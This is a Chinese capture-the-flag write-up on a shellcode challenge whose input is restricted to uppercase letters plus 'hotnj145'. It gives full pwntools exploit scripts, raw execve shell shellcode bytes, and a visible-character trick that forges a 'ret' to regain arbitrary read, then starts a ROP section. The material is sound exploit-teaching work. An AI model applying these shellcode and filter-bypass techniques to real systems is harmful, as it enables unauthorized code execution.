
# [原创]可见shellcode字符的艺术

# 可见shellcode字符的艺术

> 最近在某新生赛中看见了一道shellcode题，要求是可见字符，一般的可见shellcode字符限制的话通常是ASCII可见字符，难一点就不包含特殊符号，但是这道题的限制是仅可用大写`A-Z`外加`hotnj145`这几个字符，这就让我很感兴趣了，这些字符构造shellcode有多大作用呢？

![img](upload/attach/202210/903037_TXGN24UEKE622P3.png)

## 0x00简介

题目文件 - 链接：<mark class="encrypted">0d4K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6H3j5h3&6Q4x3X3g2T1j5h3W2V1N6g2)9J5k6h3y4G2L8g2)9J5c8Y4y4Q4x3V1j5I4y4W2S2s2i4K6u0V1b7X3!0d9P5W2y4B7e0s2p5&6K9g2m8Z5y4f1k6h3y4s2A6Y4i4K6y4r3M7s2N6V1i4K6y4p5b7#2c8r3c8R3`.</mark>

本地测试环境是`ubuntu18`，`libc-2.27-3ubuntu1.6`

先来看看伪代码

![image-20221001180437105](upload/attach/202210/903037_FQABVTRYT4KYUNT.png)

`mmap`开了`0x100`大小`RWX`的块，我们可以输入`0x80`大小数据，但随后会有`inwhitelist`函数的检查，如果检查失败则打印Hacker并退出，接下来看看`inwhitelist`函数

![image-20221001180649037](upload/attach/202210/903037_R4X8TDUKPWA49KM.png)

![image-20221001180704705](upload/attach/202210/903037_AUU5VPJZQMWTKZN.png)

可以看到这就是一个白名单字符检查，必须要使用上图`whitelist`数组里的字符，否则退出

## 0x01 绕过strlen函数

由于白名单检查的时候，数据长度是由`strlen`函数提供的，而`strlen`函数的检查机制就是遇到NULL字符停止，但是又不能直接传入NULL字符作为开头，因为之后执行的时候会被认为是非法指令，所以说需要一个带NULL字符的合法指令放在开头，然后shellcode正常跟在后面就行

```
from pwn import *
context(os='linux',arch='amd64')
p = process('./shellcode')
payload = asm('xor eax,0x4141') + asm(shellcraft.sh())
print(payload)
p.sendafter(b'you',payload)
p.interactive()
```

![image-20221001182242045](upload/attach/202210/903037_M7SWPQ4R2ZMV4Y6.png)

注意打印出来的shellcode开头，`xor eax,0x4141`其实就是`5AA\x00\x00`，因为`eax`是4字节的而我们的立即数只传入了2字节所以会产生NULL字符补充高位

这种方法确实解决了这道题，但是还没完呢，通过绕过`strlen`函数的方式总感觉有点投机取巧，如果就按照题目的限制撸个shellcode出来多帅啊，很明显我想当一回真英雄，于是有以下研究，将一些技巧融入几个实际利用的手法中介绍

## 0x02 再次读入shellcode

首先，大概整理一下可以现在还可以用哪些指令

```
push 0x34343434
push all_reg
pop rax rcx rdx r8-10
xor al,0x41
xor dword ptr [r8], eax
xor dword ptr [rax], eax #1\x00
xor dword ptr [rax+0x41], ebx ecx edx ebp ...
xor dword ptr [rcx], esi #11
xor qword ptr [r8 + 0x4d], rcx #A1\x00
xor dword ptr [rcx], esi
xor dword ptr [rax + 0x6f], r9d
xor dword ptr [rbx + 0x31], eax
xor eax, 0x4141
xor dword ptr [rip], esi #xor rip出现不同指令
xor qword ptr [rip], rsi
xor qword ptr [rip], r14
add byte ptr [r8], al #A\x00
```

不完整，只是大概看看能输入怎样的指令，注意有些指令结尾是需要`\x00`的，有些可以通过增加立即数避免产生，有些则无法避免，如果不输入NULL字符的话，就将指令放结尾由缓冲区默认的NULL字符补充为合法指令，但是就无法继续在后面增加指令了，因为继续输入会覆盖掉这些NULL字符

我们仔细看看`main`函数

![image-20221001192708665](upload/attach/202210/903037_72JHUUYMHYT756B.png)

如果我们能跳转到`1314`的位置，就可以控制`read`函数的指针达到任意写，因为`rax`是我们可控的，而`rsi`不行，因为`pop rsi`编译是`_`字符，不在白名单中

众所周知，`rip`寄存器正常情况是不可读不可写的，只能通过某些指令间接操作，例如`ret`指令，但是`ret`指令值是`0xc3`是不可见字符，该怎么构造呢，一番捣鼓过后发现`0xc3 / 2 / 2 == 0x41`，而`0x41`是可见字符A，那么操作空间就有了

我们先观察一下此时的寄存器和堆栈的状态

![image-20221001194323397](upload/attach/202210/903037_RRAMYSKRP8GXZ9U.png)

`rax/rdi/rsi`指向的值都是当前用于**存储`shellcode`的内存块开头的地址**，**`r12`寄存器是`_start`的地址**，其次，如果没有输入指令地方默认就是**NULL字节将会被解析成`add byte ptr [rax], al`指令**，所以说后面都是一样的指令

那么，执行`xor al,0x41`指令看看

![image-20221001195003527](upload/attach/202210/903037_DWH5H753HU8ZG5K.png)

![image-20221001195109772](upload/attach/202210/903037_UKTZFDY4KPNS73S.png)

![image-20221001195123576](upload/attach/202210/903037_VAJSFTJV63BDBD5.png)

![image-20221001195224619](upload/attach/202210/903037_8D65JFSBJ92KN82.png)

![image-20221001195243107](upload/attach/202210/903037_N5A689U5XN7AUM4.png)

![image-20221001195406029](upload/attach/202210/903037_TYTYZSBU2KYKA97.png)

可以执行三次默认的`add`指令后，`rax`指向地址的值变成了`0xc3`也就是`ret`指令，但是问题也很明显，之后还会继续执行`add`将会继续改变`+0x41`地址里的值就变成其他指令了，所以说我们要恰好在`+0x41`偏移的位置执行`ret`，中间的空间可以用一下无意义指令填充，而`ret`之后执行流改变也就不用管后面的指令了

那么现在的操作就很简单了，构造出`程序基址+1314`的值`push`进栈顶，之后`ret`执行的时候就`pop`进`rip`了，`_start`地址与执行`read`片段位置的异或值是`0x214`，由于立即数也只能用白名单里的字符要想办法构造，fuzz一下发现`0x41414141^0x41414355=0x214`，因为单个字节异或不出`0x214`，只用两个字节又会产生NULL字符，所以说选用两个四字节但高2字节相同的就好

```
>>> hex(0x565172b69100^0x565172b69314)
'0x214'
>>> hex(0x41414141^0x41414355)
'0x214'
```

先上`payload`

```
payload = asm(
'''
push 0x41414141
pop rax
push rax
push rax
push rax
push rax
push rax
push rax
push rax
push rax
push rax
push rax
push rsp
pop rax
push 0x41414355
pop rcx
xor dword ptr [rax+0x48], ecx #0x41414141^0x41414355=0x214 ; 构造0x214，加偏移才能满足白名单字符
pop rcx
pop rcx
pop rcx
pop rcx
pop rcx
pop rcx
pop rcx
pop rcx
pop rcx
pop rcx
push r12 #r12=_start
xor dword ptr [rax+0x48], ecx #_start^0x214=gadget_addr
push 0x41414141
pop rdx #控制read的读入字节数
push rdi #无意义指令，填充位置
pop rax
push rdi
pop rax
push rdi
pop rax
pop rcx
push rcx
push rcx
xor al,0x41 #构造0xc3->ret指令
''')
```

操作可以分成几个部分，现在解读一下，首先一直`push rax`是为了填充栈，因为不想在其中包含NULL字符，所以需要增加立即数来使用`xor dword ptr [rax+0x48], ecx`，已经尽量选了一个比较小的，`push rsp; pop rax`是将栈指针传递给`rax`之后就能通过`rax`加偏移异或`ecx`来修改栈中的值，首先构造出`0x214`在栈中，再把用于填充的值再`pop`走让`rcx=0x214`，`r12`是`_start`地址前面已经说过，异或`0x214`就得到我们想要的`read`片段的地址，这里注意栈虽然`pop`很多次已经降下来了，但`rax`值没变，所以直接用就行，看图

![image-20221001203034203](upload/attach/202210/903037_CPNKGQJ2KPFW4ZF.png)

`0x7ffd166c8eb8+0x48==0x7ffd166c8f00`，所以直接`push r12`就行

![image-20221001203203623](upload/attach/202210/903037_QCJM7WCC9NWZQR9.png)

之后`rsp`就是`read`函数片段的地址，之后将`rdx`设置为`0x41414141`，一个巨大的值，之后调用`read`就能随意写入，接着的`push ; pop`指令都是无意义操作，单纯填充位置，因为要在`+0x41`位置才能调用`ret`

![image-20221001203535755](upload/attach/202210/903037_MQC48JSV5NYN45Q.png)

成功回到`main`中调用`read`函数，这里直接写入任意`shellcode`就行，写入的位置为`shellcode地址+0x41`的位置，也就是从`ret`这条指令本身开始覆盖写，虽然我们手动调用`read`造成任意字符写，之后会重新进入`shellcode`块重新执行，之后会发现执行`shellcode`出现了问题，在`+0x41`位置开始的指令跟我们传入的不一样，比如

![image-20221001204052057](upload/attach/202210/903037_ME3SQGBDWKJ9N34.png)

这是因为，程序再次执行了之前写入的`shellcode`，其中默认NULL字符被解析成的`add`指令会修改`+0x41`位置的值，造成指令被篡改，这也是我们造出`ret`指令的方法，现在只需要预判一下会修改哪个字节让他修改的结果是我们本身想执行的指令就行，调试一下就能知道其实就是第一个字节被改了，我传入的`shellcode`如下：

```
p.sendline(b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05")
```

将第一个字节`\x31`拿出来运算

```
>>> (0x31-0x41)&0xff
240
>>> (240-0x41)&0xff
175
>>> (175-0x41)&0xff
110
>>> hex(110)
'0x6e'
```

`&0xff`是因为`add`时候是单字节操作，不会影响高位，所以只取一个字节，`\x6e`经过运算就能还原成`\x31`，从而保持`shellcode`不变，修改第一个字节变成：

```
p.sendline(b"\x6e\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05")
```

现在能正常执行：

![image-20221001205107398](upload/attach/202210/903037_GYEBWFND4CRSGND.png)

![image-20221001205206437](upload/attach/202210/903037_7GFRXQ97V6NNX8M.png)

`exp`:

```
from pwn import *
context(log_level='debug',os='linux',arch='amd64')
p = process('./shellcode')
#p = remote('119.3.83.106',10565)
#gdb.attach(p,'brva 0x1385\nc\nsi')
payload = asm(
'''
push 0x41414141
pop rax
push rax
push rax
push rax
push rax
push rax
push rax
push rax
push rax
push rax
push rax
push rsp
pop rax
push 0x41414355
pop rcx
xor dword ptr [rax+0x48], ecx #0x41414141^0x41414355=0x214 ; 构造0x214，加偏移才能满足白名单字符
pop rcx
pop rcx
pop rcx
pop rcx
pop rcx
pop rcx
pop rcx
pop rcx
pop rcx
pop rcx
push r12 #r12=_start
xor dword ptr [rax+0x48], ecx #_start^0x214=gadget_addr
push 0x41414141
pop rdx #控制read的读入字节数
push rdi #无用指令，填充位置
pop rax
push rdi
pop rax
push rdi
pop rax
pop rcx
push rcx
push rcx
xor al,0x41 #构造0xc3->ret指令
''')
print(payload)
p.sendafter(b'you',payload)
#pause()
sleep(1)
#p.sendline(b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05")
p.sendline(b"\x6e\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05")
p.interactive()
```

其中传入的可见字符`shellcode`：

```
hAAAAXPPPPPPPPPPTXhUCAAY1HHYYYYYYYYYYAT1HHhAAAAZWXWXWXYQQ4A
```

## 0x03 ROP

> 既然能造`ret`指令，那再布局一下栈，岂不是直接ROP，起飞~

要想控制栈就要对栈调用`read`写入，因为用`shellcode`太麻烦了，而且长度有限，而上一节中`rax`不是完全可控的，如果改变`rax`的值也会影响到`ret`指令的构造，但是又不能直接`pop rsi`（不在白名单中），所以用`pop rsi; pop r15; ret`的`gadget`来代替`rax`控制`read`函数写入的位置，调整一下调用`read`的位置为`+0x1317`偏移处（见下图），还有，固定在`+0x41`偏移调用`ret`相当于变相削减`shellcode`长度，这里介绍一下其它构造`ret`指令的方式

![image-20221002160545664](upload/attach/202210/903037_VWXFDE2EAGY7JPE.png)
